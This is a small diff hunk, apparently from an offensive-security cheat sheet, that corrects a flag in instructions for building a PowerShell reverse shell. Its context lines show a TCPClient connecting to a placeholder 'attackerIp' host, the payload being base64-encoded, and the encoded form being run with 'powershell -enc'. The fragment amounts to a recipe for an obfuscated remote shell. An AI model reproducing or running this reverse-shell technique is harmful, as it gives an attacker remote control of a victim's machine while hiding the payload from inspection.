@@ -8,7 +8,7 @@ PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("attackerIp",atta
 PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 PS> $EncodedText =[Convert]::ToBase64String($Bytes)
 
-cmd> powershell enc xyz
+cmd> powershell -enc xyz
 ```
 
 
